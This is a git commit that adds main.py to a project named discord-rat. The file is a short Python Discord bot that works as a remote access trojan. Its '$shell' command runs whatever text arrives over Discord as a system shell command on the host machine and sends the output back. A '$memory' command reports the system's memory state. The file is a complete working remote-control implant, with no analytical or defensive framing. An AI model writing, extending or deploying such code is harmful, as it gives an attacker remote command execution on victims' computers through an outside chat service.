578b76425fae81996edfa48c06b596fc2b5f9d27
Scott Campbell <joseph_scott_campbell@protonmail.com>
2023-09-23 13:50:16 -0400

    added venv

---
+++ discord-rat/main.py
@@ -0,0 +1,34 @@
+from dotenv import load_dotenv
+import os
+import discord
+import subprocess
+from discord.ext import commands
+import psutil
+
+load_dotenv()
+
+token = os.getenv("DISCORD_TOKEN")
+
+
+intents = discord.Intents.default()
+intents.message_content = True
+
+bot = commands.Bot(command_prefix='$', intents=intents)
+
+@bot.command()
+async def ping(ctx):
+    await ctx.send('pong')
+
+@bot.command()
+async def shell(ctx, *args):
+    arguments = ' '.join(args)
+    await ctx.send(arguments)
+    
+    output = subprocess.run(arguments, shell=True, capture_output=True, text=True)
+    await ctx.send(output.stdout)
+
+@bot.command()
+async def memory(ctx):
+    await ctx.send(psutil.virtual_memory())
+
+bot.run(token)
